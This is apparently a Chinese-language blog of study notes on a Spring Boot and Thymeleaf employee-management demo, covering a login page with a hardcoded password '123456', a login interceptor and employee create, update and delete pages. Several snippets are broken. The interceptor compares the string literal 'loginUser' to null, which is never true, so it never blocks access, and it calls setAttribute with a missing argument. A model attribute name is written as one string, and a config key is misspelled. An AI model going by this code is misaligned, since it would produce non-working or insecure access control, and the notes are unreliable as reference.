class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//具体业务</span></span><span class="line"><span style="color: #C678DD">if</span><span style="color: #E06C75">(</span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">StringUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isEmpty</span><span style="color: #ABB2BF">(username)</span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #98C379">&quot;123456&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(password)</span><span style="color: #E06C75">){</span><span style="color: #7F848E; font-style: italic">//账号不为空，密码是123456</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;dashboard//登陆的成功页面</span></span><span class="line"><span style="color: #98C379">}else {</span></span><span class="line"><span style="color: #98C379">    //告诉用户你登陆失败了</span></span><span class="line"><span style="color: #98C379">    model.addAttribute(&quot;</span><span style="color: #E06C75">msg</span><span style="color: #98C379">&quot;,&quot;</span><span style="color: #E06C75">用户名或者密码错误</span><span style="color: #98C379">&quot;);//msg 只是一个自定义的属性名（key）</span></span><span class="line"><span style="color: #98C379">    return &quot;</span><span style="color: #E06C75">index</span><span style="color: #98C379">&quot;;//登录页面</span></span><span class="line"><span style="color: #98C379">}</span></span></code></pre></div></div></figure></li><li><p>登录错误，但是没有回显（错误提示），还是保持在index</p><p>添加错误提示  在index</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251102204319036.png" alt="image-20251102204318947"></p><figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">&lt;!--如果msg的值为空，则不显示消息，|--&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">style</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;color: red&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:text</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${msg}&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">th:if</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;${not #strings.isEmpty(msg)}&quot;</span><span style="color: #ABB2BF">&gt;&lt;/</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><p>这个时候用上了上面的msg</p><p>后面条件，如果msg不等于空，就显示代码（登录成功msg就不赋值，是空）</p></li><li><p>登录成功之后的url</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251102204800982.png" alt="image-20251102204800956">、</p><ol><li><p>直接使用映射功能</p><p>在MyMvcConfig里面添加</p><figure class="shiki Java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre><code>//具体业务if(!StringUtils.isEmpty(username)&&"123456".equals(password)){    return "redirect:/main.html";//直接重印到main.html}else {    //告诉用户你登陆失败了    model.addAttribute("msg","用户名或者密码错误");    return "index";}</code></pre></div></div></figure><p>return “redirect:&#x2F;main.html”;&#x2F;&#x2F;直接重印到main.html</p></li><li><p>在MyMvcConfig里面添加</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251102205232682.png" alt="image-20251102205232648"></p></li><li><p>结果</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251102205252303.png" alt="image-20251102205252270"></p></li></ol></li><li><p>同时就衍生出一个问题</p><p>不需要登录，直接写&#x2F;main.html即可访问</p><p>所以需要<strong>登录拦截器</strong></p></li></ul><h2 id="登录拦截器"><a href="#登录拦截器" class="headerlink" title="登录拦截器"></a>登录拦截器</h2><ul><li><p>写Interceptor</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.example.demo.config</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">jakarta.servlet.http.HttpServletRequest</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">jakarta.servlet.http.HttpServletResponse</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.web.servlet.HandlerInterceptor</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.web.servlet.ModelAndView</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">LoginHandlerInterceptor</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HandlerInterceptor</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">boolean</span><span style="color: #61AFEF"> preHandle</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">HttpServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">handler</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span></code></pre></div></div></figure></li><li><p>是否放行</p><ol><li><p>如果登录成功就要获取session</p><p>所以先从具体业务中生成session</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251102210204383.png" alt="image-20251102210204331"></p><p>先加入session，再代码执行中生成session（就叫username）（此处的LoginUser和拦截器的检验名称相同）</p></li><li><p>编写拦截器</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">boolean</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">preHandle</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #E06C75"> request</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HttpServletResponse</span><span style="color: #E06C75"> response</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> handler) throws Exception {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getSession</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">setAttribute</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;loginUser&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #98C379">&quot;loginUser&quot;</span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span><span style="color: #7F848E; font-style: italic">//没登录</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAttribute</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;mag&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;没有权限登录&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRequestDispatcher</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/index.html&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">forward</span><span style="color: #ABB2BF">(request,response);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span><span style="color: #C678DD">else</span><span style="color: #E06C75">  {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p>如果没登录，就是没有session，loginUser（接上面文件的命名）就是空</p><p>跳转到index，不放行</p><p>否则就是，放行</p></li><li><p>配置拦截器（MyMvcConfig）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">addInterceptors</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">InterceptorRegistry</span><span style="color: #E06C75"> registry) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">registry</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addInterceptor</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">LoginHandlerInterceptor</span><span style="color: #ABB2BF">()).</span><span style="color: #61AFEF">addPathPatterns</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/**&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">excludePathPatterns</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/index&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;/&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;/user/login&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>addPathPatterns(“&#x2F;**”)排除所有请求</p><p>excludePathPatterns(“&#x2F;index”,”&#x2F;“,”&#x2F;user&#x2F;login”)不排除这些请求</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251102211525489.png" alt="image-20251102211525445"></p><p>原因：</p><p>就是没有排除静态资源</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">addInterceptors</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">InterceptorRegistry</span><span style="color: #E06C75"> registry) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">registry</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addInterceptor</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">LoginHandlerInterceptor</span><span style="color: #ABB2BF">()).</span><span style="color: #61AFEF">addPathPatterns</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/**&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">excludePathPatterns</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/index&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;/&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;/user/login&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;css/*&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;js/**&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;img/**&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">}</span><span style="color: #7F848E; font-style: italic">//比如有css，js，img</span></span></code></pre></div></div></figure></li><li><p>成功之后再登录页面（dashboard.html）可以修改自己的用户名</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251102212336240.png" alt="image-20251102212336096"></p><p>因为刚刚的session的值loginuser就等于username，所以直接将这个用目的名称回显修改为上述即可</p></li></ol></li></ul><h2 id="展示员工列表"><a href="#展示员工列表" class="headerlink" title="展示员工列表"></a>展示员工列表</h2><ul><li><p>在EmployController编写代码</p><p>用于接收请求</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103102923801.jpg" alt="9cbc889ac4dda21252f47f89e1eda1d0"></p></li><li><p>修改在  成功登录页面（dashboard.html）的接收路径</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103103147052.png" alt="image-20251103103146783"></p><p>而且还要和list.html同步绑定，接收路径（以用于在接收list之后映射到页面）</p></li><li><p>编辑侧边栏</p><p>在dashboard文件内，将侧边栏单另出来（相当于将<code>侧边栏</code>变成组件）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103103838277.jpg" alt="e50b587c98b106b05b65ac6a2a9e3b85"></p><p>在list文件进行调用</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103104020510.jpg" alt="e50b587c98b106b05b65ac6a2a9e3b85"></p><p>这样进入页面之后，两个页面的侧边栏名称相同，都变成<code>员工管理</code></p></li><li><p>接下来修改头部（上导航栏）（就是那个进入的第一个栏）</p><p>同上</p></li><li><p>由于两者都变成了组件<code>侧边栏</code> <code>头部</code></p><p>所以需要在templates目录写conmmons目录下commons.html用于<strong>写自己所写的组件</strong></p><p>直接将刚刚两个html中的输入剪切到commons.html</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103104652841.png" alt="image-20251103104652550"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103104652841.png"></p><p>但是要让dashboard.html   list.html存在跳转到commons.html</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103104942431.png" alt="image-20251103104942131"></p></li><li><p>使用括号传参，选择跳转页面进行高亮字体（就是点哪里，哪里亮）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103110400843.jpg" alt="f1542a42bea684cfac69ced8dcd7b7d7"></p></li><li><p>前端显示动态传参数据</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103105946954.png" alt="image-20251103105946716"></p></li><li><p>在前端页面配置</p><p>调用employeedao的方法，进行删除和编辑，同时添加按钮</p></li></ul><h2 id="增加员工"><a href="#增加员工" class="headerlink" title="增加员工"></a>增加员工</h2><p>先写按钮—-点击后跳转—添加成功—返回首页</p><ul><li><p>编写按钮样式，修改颜色；配置点击后的跳转路径</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103113620426.jpg" alt="584cd57f98cb41483a40ea1bf3519dff"></p></li><li><p>编写跳转配置文件</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103165032671.png" alt="image-20251103165025561"></p><p>通过按钮，以get方式跳转到EmployeeController</p><p>然后再EmployeeController再跳转</p><p>因为浏览器的按钮只能<strong>发起请求（request）</strong>，而 Spring 的 Controller 负责<strong>接收请求 → 处理业务 → 再返回页面或数据</strong>。<br>所以你必须在 Controller 里写一个方法，告诉框架：“当访问这个路径时，应该跳转到哪个页面”</p><table><thead><tr><th>步骤</th><th>行为</th><th>说明</th></tr></thead><tbody><tr><td>①</td><td>用户点击按钮</td><td>浏览器访问 URL <code>/emp</code></td></tr><tr><td>②</td><td>Spring Boot 收到请求 <code>/emp</code></td><td>找到 Controller 中对应的 <code>@GetMapping(&quot;/emp&quot;)</code> 方法</td></tr><tr><td>③</td><td>Controller 方法执行并返回 <code>&quot;emps/add&quot;</code></td><td>告诉 Spring 去渲染 <code>templates/emps/add.html</code></td></tr><tr><td>④</td><td>浏览器显示添加页面</td><td>用户看到“添加员工”表单页面</td></tr></tbody></table></li><li><p>EmployeeController拟写跳转的方法</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/emp&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">toAddpage</span><span style="color: #E06C75">(){</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;emps/add&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p>添加add.html（内容和list.html相同）</p><p>只需要改此处</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103165837354.png" alt="image-20251103165837223"></p><p>使用bootstrap工具，修改表单</p><p>将Employee中的变量一一对应即可</p><p>运行之后就会跳转到表单页面</p></li><li><p>但是发现部门匹配的是编号（12345）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103172357709.png" alt="image-20251103172357649"></p><p>所以需要再controller中查询信息</p></li><li><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/emp&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">toAddpage</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Model</span><span style="color: #E06C75"> model){</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Collection</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Department</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> departments</span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">departmentDao</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDepartments</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">model</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addAttribute</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;departments,departments&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;emps/add&quot;</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure><p>查询departmentDao中的getDepartments</p></li><li><p>前端添加相关的跳转属性</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103192922009.png" alt="image-20251103192921946"></p><p>选择部门之后转化为对应的数字，用于员工表</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103192041581.png" alt="image-20251103192041540"></p><p>在此处写一个跳转（&#x2F;emp）</p><p><strong>注意：</strong>此处的emp和上面的不一样</p><p>因为上面的是get提交（只是获得跳转），此处是表单post提交</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">PostMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/emp&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">addemp</span><span style="color: #E06C75">(){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;redirect:/emps&quot;</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//“redirect:/emps” 是后端常见的页面重定向指令，核心作用是把请求转发到 “/emps” 对应的资源</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>为了添加成功，刷新表单</p></li><li><p>提交信息时填写生日</p><p>xxx&#x2F;sss&#x2F;mmm正常</p><p>xxx-sss-mmm报错</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103193303495.png" alt="image-20251103193303457"></p><p><strong>原因：</strong></p><ul><li><p>源码中视图解析器（WebMvcAutoConfiguration）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103193447336.png" alt="image-20251103193447301"></p></li><li><p>如果要变成xxx-sss-mmm</p><p>就要在配置文件中修改</p><figure class="shiki properties"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">spring.mnv.data-format</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">xxx-sss-mmm</span></span></code></pre></div></div></figure></li></ul></li></ul><h2 id="修改员工"><a href="#修改员工" class="headerlink" title="修改员工"></a>修改员工</h2><p>存在编辑中</p><ul><li><p>先修改点击按钮的跳转路劲</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103194538944.png"></p></li><li><p>写跳转代码到update文件中（同上复制add）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//跳转到员工修改界面</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">toupdateEMP</span><span style="color: #E06C75">(){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;emps/update&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>需要查出原有数据（需要和刚刚的页面进行交互）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">/</span><span style="color: #E06C75">跳转到员工修改界面</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">toupdateEMP</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">PathVariable</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;id&quot;</span><span style="color: #E06C75">) </span><span style="color: #E5C07B">Integer</span><span style="color: #E06C75"> id</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">Model</span><span style="color: #E06C75"> model){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//查出原来的数据</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Employee</span><span style="color: #E06C75"> employee </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">employeeDao</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getEmployeeById</span><span style="color: #ABB2BF">(id);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">model</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addAttribute</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;emp&quot;</span><span style="color: #ABB2BF">,employee);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;emps/update&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>修改undate前端的接收（接收未修改的lastname，email….到编辑界面）<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103195612949.png" alt="image-20251103195612856"></p></li><li><p>点击修改，将信息返回到表单</p><p>写跳转代码</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">PostMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/updateEMP&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">updateEMP</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Employee</span><span style="color: #E06C75"> employee){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">employeeDao</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">save</span><span style="color: #ABB2BF">(employee);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;redirect:/emps&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>前端</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103200828429.png"></p><p>上面的post提交是在&#x2F;updateEMP</p><p>这样不会修改，而是增加了成员名单</p><p>因为每次修改都会改变id值</p></li><li><p>携带上隐藏id即可</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103201200954.png" alt="image-20251103201200905"></p></li></ul><h2 id="删除员工"><a href="#删除员工" class="headerlink" title="删除员工"></a>删除员工</h2><ul><li><p>前端接收点击请求</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251103201323489.png" alt="image-20251103201323433"></p></li><li><p>后端</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//删除员工</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/delemp/{id}&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">deleteEmp</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: 